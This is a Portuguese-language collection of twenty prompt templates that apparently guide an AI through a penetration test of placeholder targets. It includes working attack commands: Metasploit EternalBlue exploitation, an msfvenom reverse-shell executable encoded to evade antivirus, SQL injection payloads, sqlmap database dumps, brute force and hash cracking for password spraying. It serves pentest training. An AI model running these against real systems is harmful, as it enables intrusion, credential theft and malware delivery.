
### **Prompt 1: Reconhecimento Passivo Inicial**

*   **Persona:** Especialista em Pentest Iniciando um Engajamento.
*   **Tarefa:** Realizar o reconhecimento passivo de um domínio alvo para coletar informações sem enviar tráfego diretamente para a infraestrutura do cliente.
*   **Etapas:**
    1.  Consultar dados WHOIS para obter informações de registro.
    2.  Enumerar subdomínios utilizando técnicas passivas.
    3.  Coletar endereços de e-mail e informações de funcionários.
    4.  Identificar tecnologias utilizadas (WAPPalyzer).
    5.  Verificar vazamentos de dados em repositórios públicos (GitHub, Pastebin).
*   **Contexto:** Domínio alvo: `target.com`. O escopo inclui qualquer subdomínio sob `target.com`.
*   **Objetivo:** Criar um perfil inicial do alvo e identificar possíveis vetores de ataque superficiais.
*   **Saída Esperada:** Um relatório resumido em markdown contendo: Informações WHOIS, lista de subdomínios encontrados, e-mails relevantes, tecnologias identificadas (ex: Apache 2.4, WordPress 6.0) e qualquer credencial vazada encontrada. Incluir os comandos exatos para ferramentas como `theHarvester` e `amass`.

---

### **Prompt 2: Escaneamento de Portas e Serviços**

*   **Persona:** Analista de Pentest mapeando a superfície de ataque.
*   **Tarefa:** Executar um escaneamento de portas detalhado em um endereço IP ou intervalo de IPs alvo para descobrir serviços ativos.
*   **Etapas:**
    1.  Executar um scan rápido de portas mais comuns (`-F`).
    2.  Executar um scan completo de todas as portas (`-p-`).
    3.  Executar um scan de detecção de versão e script padrão (`-sV -sC`) nas portas abertas.
    4.  Salvar os resultados em três formatos: normal, greppável (Grepable) e XML.
*   **Contexto:** IP alvo: `192.168.1.50`. A rede é considerada "hostil", portanto, evite scans excessivamente ruidosos.
*   **Objetivo:** Identificar todos os pontos de entrada (portas abertas) e os serviços/versões executando neles.
*   **Saída Esperada:** O comando Nmap completo e estruturado para cada etapa. Uma análise da saída, destacando serviços interessantes (ex: HTTP na porta 8080, SMB na 445, SSH na 22) e possíveis vulnerabilidades baseadas na versão.

---

### **Prompt 3: Análise de Vulnerabilidades com Nmap NSE**

*   **Persona:** Analista de Pentest aprofundando a análise.
*   **Tarefa:** Utilizar os scripts do Nmap (NSE) para procurar vulnerabilidades específicas nos serviços identificados.
*   **Etapas:**
    1.  Analisar o resultado do scan `-sV` para identificar serviços.
    2.  Para cada serviço (ex: HTTP, FTP, SMB), selecionar categorias relevantes de scripts NSE (ex: `vuln`, `safe`, `auth`, `discovery`).
    3.  Construir o comando Nmap para executar os scripts escolhidos.
*   **Contexto:** IP: `192.168.1.50`. Portas abertas: 80 (HTTP), 445 (SMB), 21 (FTP).
*   **Objetivo:** Descobrir vulnerabilidades conhecidas ou misconfigurações usando a poderosa engine de scripts do Nmap.
*   **Saída Esperada:** Comandos Nmap específicos para cada serviço. Ex: `nmap -p 445 --script smb-vuln* 192.168.1.50` e `nmap -p 80 --script http-vuln* 192.168.1.50`. Explicar brevemente o que cada script faz.

---

### **Prompt 4: Varredura com Nessus/OpenVAS**

*   **Persona:** Pentester utilizando ferramentas de varredura automatizada.
*   **Tarefa:** Configurar e executar uma varredura de vulnerabilidades no alvo usando o OpenVAS (ou Nessus).
*   **Etapas:**
    1.  Configurar um novo alvo no OpenVAS com o endereço IP.
    2.  Criar uma nova tarefa do tipo "Varredura de Vulnerabilidades" full and fast.
    3.  Selecionar um scan config apropriado (ex: "Descoberta de Rede Viva" + "Varredura de Vulnerabilidades de Rede Completa e Rápida").
    4.  Iniciar a tarefa e monitorar seu progresso.
    5.  Analisar o relatório gerado.
*   **Contexto:** IP alvo: `192.168.1.50`. Credenciais de login do Greenbone/OpenVAS são conhecidas.
*   **Objetivo:** Complementar a análise manual com uma varredura automatizada e abrangente de vulnerabilidades conhecidas.
*   **Saída Esperada:** Os passos exatos na GUI do OpenVAS (ou comandos CLI se usando `gvm-cli`). Um resumo das vulnerabilidades críticas/altas encontradas, com seus OIDs e CVSS scores.

---

### **Prompt 5: Enumeração SMB**

*   **Persona:** Pentester focado em ambientes Windows.
*   **Tarefa:** Enumerar informações e potenciais pontos de entrada em um servidor SMB.
*   **Etapas:**
    1.  Listar shares de rede disponíveis.
    2.  Verificar se o acesso anônimo (Null Session) é permitido.
    3.  Enumerar usuários do sistema via SMB.
    4.  Tentar acessar shares desprotegidos.
*   **Contexto:** IP: `192.168.1.50`. Porta 445 está aberta.
*   **Objetivo:** Obter informações sensíveis, listas de usuários e acesso a arquivos compartilhados.
*   **Saída Esperada:** Comandos sequenciais do `smbclient` e `enum4linux`. Ex: `smbclient -L //192.168.1.50 -N`, `enum4linux -a 192.168.1.50`. Análise da saída, destacando shares acessíveis e usuários enumerados.

---

### **Prompt 6: Exploração com Metasploit**

*   **Persona:** Pentester na fase de exploração.
*   **Tarefa:** Explorar uma vulnerabilidade específica usando o framework Metasploit.
*   **Etapas:**
    1.  Procurar pelo módulo de exploit correspondente à vulnerabilidade (ex: `ms17-010`).
    2.  Configurar as opções obrigatórias do módulo (RHOSTS, LHOST, PAYLOAD).
    3.  Executar o exploit.
    4.  Estabelecer uma sessão Meterpreter.
*   **Contexto:** IP alvo (`192.168.1.50`) é vulnerável ao EternalBlue (MS17-010). IP da máquina atacante: `10.0.0.25`.
*   **Objetivo:** Obter acesso inicial ao sistema alvo.
*   **Saída Esperada:** A sequência exata de comandos do `msfconsole`. Ex: `search ms17-010`, `use exploit/windows/smb/ms17_010_eternalblue`, `set RHOSTS 192.168.1.50`, `set LHOST 10.0.0.25`, `run`. Confirmação de uma sessão Meterpreter aberta.

---

### **Prompt 7: Pós-Exploração Básica no Windows**

*   **Persona:** Pentester com acesso inicial a um host Windows.
*   **Tarefa:** Realizar técnicas básicas de pós-exploração para ganhar contexto e persistência.
*   **Etapas:**
    1.  Identificar o nível de privilégio do usuário atual.
    2.  Coletar informações do sistema (hostname, versão do OS, patches).
    3.  Listar processos em execução.
    4.  Tentar migrar para um processo executado como SYSTEM.
    5.  Buscar flags de proof-of-concept (ex: `user.txt`, `root.txt`).
*   **Contexto:** Sessão Meterpreter ativa em um host Windows.
*   **Objetivo:** Escalar privilégios, coletar informações e provar o comprometimento.
*   **Saída Esperada:** Comandos do Meterpreter e shell (`getuid`, `sysinfo`, `ps`, `migrate <PID>`, `search -f user.txt`). Saída desses comandos analisada.

---

### **Prompt 8: Análise de Tráfego com Wireshark**

*   **Persona:** Analista de Pentest investigando tráfego de rede.
*   **Tarefa:** Analisar um arquivo de captura de rede (PCAP) para identificar tráfego malicioso ou anomalias.
*   **Etapas:**
    1.  Abrir o arquivo PCAP no Wireshark.
    2.  Aplicar filtros para isolar tráfego HTTP.
    3.  Seguir um fluxo TCP para reconstruir uma conversa.
    4.  Verificar por tentativas de login ou dados exfiltrados.
*   **Contexto:** Arquivo PCAP: `capture.pcap` proveniente de um sensor de rede durante o teste.
*   **Objetivo:** Identificar como a exploração ocorreu ou que dados foram acessados.
*   **Saída Esperada:** Os filtros de Wireshark usados (ex: `http.request.method == POST`). Uma descrição passo a passo de um fluxo malicioso identificado, mostrando, por exemplo, um upload de webshell ou uma tentativa de força bruta.

---

### **Prompt 9: Teste de Força Bruta em Login Web**

*   **Persona:** Pentester testando autenticação.
*   **Tarefa:** Realizar um ataque de força bruta contra um formulário de login web.
*   **Etapas:**
    1.  Identificar o formulário de login (URL, parâmetros `user` e `pass`).
    2.  Capturar uma requisição de login bem-sucedida com o Burp Suite.
    3.  Enviar a requisição para o Intruder.
    4.  Configurar payloads para os campos de usuário e/ou senha.
    5.  Executar o ataque e analisar os resultados.
*   **Contexto:** URL do login: `http://target.com/login.php`. Usuário potencial: `admin`. Wordlist: `rockyou.txt`.
*   **Objetivo:** Comprometer credenciais de um usuário válido.
*   **Saída Esperada:** Configuração passo a passo do Burp Suite Intruder (posições, payload sets). A senha descoberta, se bem-sucedida, ou a análise do comprimento/código de status das respostas.

---

### **Prompt 10: Exploração de SQL Injection Manual**

*   **Persona:** Pentester especializado em aplicações web.
*   **Tarefa:** Identificar e explorar manualmente uma vulnerabilidade de SQL Injection.
*   **Etapas:**
    1.  Identificar um parâmetro vulnerável (ex: `product_id=1`).
    2.  Testar com caracteres de quebra (`'`, `"`).
    3.  Determinar o número de colunas usando `ORDER BY`.
    4.  Identificar colunas visíveis com `UNION SELECT`.
    5.  Extrair informações sensíveis da database.
*   **Contexto:** URL: `http://target.com/products.php?id=1`.
*   **Objetivo:** Demonstrar a gravidade da vulnerabilidade extraindo dados sensíveis.
*   **Saída Esperada:** A sequência de payloads usados. Ex: `id=1'`, `id=1' ORDER BY 5-- -`, `id=-1' UNION SELECT 1,2,3,4,version()-- -`. A saída mostrando a versão do banco de dados ou nomes de tabelas.

---

### **Prompt 11: Exploração de SQLi com SQLmap**

*   **Persona:** Pentester automatizando a exploração.
*   **Tarefa:** Usar o SQLmap para explorar automaticamente uma injeção de SQL e obter dados.
*   **Etapas:**
    1.  Fornecer a URL vulnerável ao SQLmap.
    2.  Enumerar os databases disponíveis.
    3.  Enumerar as tabelas de um database de interesse.
    4.  Despejar os dados de uma tabela específica (ex: `users`).
*   **Contexto:** URL vulnerável: `http://target.com/products.php?id=1`. Cookie de sessão válido pode ser necessário: `PHPSESSID=abc123`.
*   **Objetivo:** Extrair rapidamente toda a estrutura do banco de dados e seus dados de forma automatizada.
*   **Saída Esperada:** Comandos SQLmap completos. Ex: `sqlmap -u "http://target.com/products.php?id=1" --cookie="PHPSESSID=abc123" --dbs`, `sqlmap ... -D target_db -T users --dump`. O dump da tabela de usuários com hashes de senha.

---

### **Prompt 12: Análise de Hash de Senhas**

*   **Persona:** Pentester após comprometer um banco de dados.
*   **Tarefa:** Quebrar hashes de senha obtidos durante a exploração.
*   **Etapas:**
    1.  Identificar o tipo de hash (ex: MD5, SHA1, bcrypt).
    2.  Usar o `hash-identifier` ou o `hashid`.
    3.  Utilizar o John the Ripper com uma wordlist para quebrar os hashes.
    4.  Utilizar o modo de força bruta se necessário.
*   **Contexto:** Arquivo `hashes.txt` contém hashes MD5 de senhas.
*   **Objetivo:** Obter as senhas em texto claro para tentativa de reuso em outros serviços (Password Spraying).
*   **Saída Esperada:** Comando para identificar o hash. Comando do John: `john --format=raw-MD5 --wordlist=rockyou.txt hashes.txt`. A lista de senhas quebradas com sucesso.

---

### **Prompt 13: Teste de Quebra de Controle de Acesso**

*   **Persona:** Pentester de aplicações web.
*   **Tarefa:** Testar se é possível acessar recursos de outros usuários (IDOR).
*   **Etapas:**
    1.  Fazer login como usuário `userA` (credenciais: `userA:passA`).
    2.  Acessar um recurso privado (ex: `http://target.com/profile.php?user_id=100`).
    3.  Alterar o parâmetro `user_id` para `101` (suposto usuário `userB`).
    4.  Verificar se os dados de `userB` são exibidos.
*   **Contexto:** A aplicação possui perfis de usuário acessíveis por um parâmetro numérico sequencial.
*   **Objetivo:** Demonstrar uma falha de controle de acesso horizontal.
*   **Saída Esperada:** A sequência de ações no navegador/Burp Suite. A confirmação de que os dados de outro usuário foram acessados com sucesso, violando a confidencialidade.

---

### **Prompt 14: Análise Estática de Código Fonte (SAST Básico)**

*   **Persona:** Pentester com acesso ao código-fonte.
*   **Tarefa:** Realizar uma análise estática básica em um trecho de código para encontrar vulnerabilidades comuns.
*   **Etapas:**
    1.  Identificar entradas de usuário (ex: `$_GET['param']`).
    2.  Rastrear o fluxo dessa entrada até uma função sensível (ex: `echo`, `query`).
    3.  Verificar se há sanitização ou preparação adequada.
*   **Contexto:** Trecho de código PHP: `$username = $_POST['user']; $sql = "SELECT * FROM users WHERE user = '$username'";`.
*   **Objetivo:** Identificar vulnerabilidades de segurança no código antes da execução.
*   **Saída Esperada:** Identificação clara da vulnerabilidade (SQL Injection). Explicação do fluxo de dados: "A entrada do usuário `$_POST['user']` é concatenada diretamente na query SQL na linha X, sem sanitização, permitindo injeção de código SQL."

---

### **Prompt 15: Criar um Payload com Msfvenom**

*   **Persona:** Pentester preparando armas.
*   **Tarefa:** Gerar um payload personalizado para obter shell reverso.
*   **Etapas:**
    1.  Escolher o tipo de payload (ex: `windows/x64/meterpreter/reverse_tcp`).
    2.  Definir o IP (LHOST) e porta (LPORT) do listener.
    3.  Escolher o formato de saída (ex: `exe`).
    4.  Codificar o payload para evadir antivírus.
*   **Contexto:** Sistema alvo: Windows 10. IP do atacante: `10.0.0.25`. Porta: `443`.
*   **Objetivo:** Criar um executável que, quando executado no alvo, forneça uma shell reversa.
*   **Saída Esperada:** O comando msfvenom completo. Ex: `msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.25 LPORT=443 -f exe -e x64/shikata_ga_nai -o payload.exe`.

---

### **Prompt 16: Fuzzing de Diretórios Web**

*   **Persona:** Pentester descobrindo conteúdo oculto.
*   **Tarefa:** Descobrir diretórios e arquivos ocultos em um servidor web.
*   **Etapas:**
    1.  Escolher uma wordlist (ex: `common.txt`, `directory-list-2.3-medium.txt`).
    2.  Executar o ferramenta de fuzzing (ex: `ffuf`, `gobuster`).
    3.  Analisar as respostas com códigos de status HTTP 200, 301, 403.
*   **Contexto:** URL alvo: `http://target.com/`.
*   **Objetivo:** Encontrar painéis de admin, backups, arquivos de configuração e outros conteúdos sensíveis não linkados.
*   **Saída Esperada:** Comando da ferramenta. Ex: `ffuf -w wordlist.txt -u http://target.com/FUZZ`. Lista de diretórios/arquivos descobertos (ex: `/admin`, `/config.old`, `/backup.sql`).

---

### **Prompt 17: Análise de um Binário com Strings**

*   **Persona:** Pentester analisando malware ou software personalizado.
*   **Tarefa:** Extrair strings imprimíveis de um binário para encontrar informações sensíveis.
*   **Etapas:**
    1.  Usar o comando `strings` no binário.
    2.  Procurar por hardcoded credentials, caminhos de API, URLs.
    3.  Filtrar a saída com `grep` para termos interessantes (ex: `password`, `http`, `key`).
*   **Contexto:** Binário: `custom_backup_tool.exe`.
*   **Objetivo:** Encontrar informações sensíveis embutidas no código compilado.
*   **Saída Esperada:** O comando: `strings custom_backup_tool.exe | grep -i password`. A saída mostrando, por exemplo, `DB_PASSWORD=SuperSecret123`.

---

### **Prompt 18: Análise de Logs do Apache**

*   **Persona:** Pentester realizando análise forense pós-exploração.
*   **Tarefa:** Analisar logs de acesso do Apache para identificar atividades maliciosas.
*   **Etapas:**
    1.  Baixar o arquivo `access.log`.
    2.  Procurar por padrões de ataque (ex: `../`, `union select`, `wp-admin`).
    3.  Identificar o IP de origem do atacante.
    4.  Reconstruir a sequência do ataque.
*   **Contexto:** Log file: `access.log.1` de um servidor web comprometido.
*   **Objetivo:** Entender o vetor de ataque e o escopo do comprometimento.
*   **Saída Esperada:** Comandos grep. Ex: `grep "union select" access.log.1`. Linhas de log extraídas mostrando as requisições maliciosas e o IP de origem `66.66.66.66`.

---

### **Prompt 19: Tunelamento com SSH**

*   **Persona:** Pentester contornando restrições de rede.
*   **Tarefa:** Criar um túnel SSH para encaminhar portas e acessar serviços internos.
*   **Etapas:**
    1.  Estabelecer um tunnel local (`-L`) ou remoto (`-R`) usando um host comprometido como jump box.
    2.  Acessar o serviço interno através de uma porta local.
*   **Contexto:** Comprometeu um host (`192.168.5.10`) com SSH aberto. Há um servidor web interno (`172.16.0.100:80`) inacessível diretamente.
*   **Objetivo:** Acessar a rede interna para aprofundar o teste.
*   **Saída Esperada:** Comando SSH: `ssh -L 8080:172.16.0.100:80 user@192.168.5.10`. Explicação: "Agora, acessar `http://localhost:8080` no seu navegador irá encaminhar o tráfego para o servweb interno `172.16.0.100:80` através do host comprometido."

---

### **Prompt 20: Geração de Relatório Executivo**

*   **Persona:** Líder do teste de invasão.
*   **Tarefa:** Sintetizar os principais achados do pentest em um resumo executivo.
*   **Etapas:**
    1.  Listar as vulnerabilidades críticas e altas descobertas.
    2.  Fornecer um resumo do impacto geral de negócio.
    3.  Dar uma recomendação de alto nível para cada problema crítico.
*   **Contexto:** O teste descobriu: 1) RCE no servidor web, 2) SQL Injection no banco de dados, 3) Configuração fraca de senha de administrador.
*   **Objetivo:** Comunicar efetivamente os riscos para a diretoria e gerência não técnica.
*   **Saída Esperada:** Um texto claro e conciso em markdown. Ex: "**Resumo Executivo:** A infraestrutura da empresa apresenta vulnerabilidades graves que permitiriam a um atacante tomar controle total dos sistemas e roubar todos os dados de clientes. Recomendamos a aplicação imediata dos patches e a revisão do código da aplicação web como prioridade máxima."
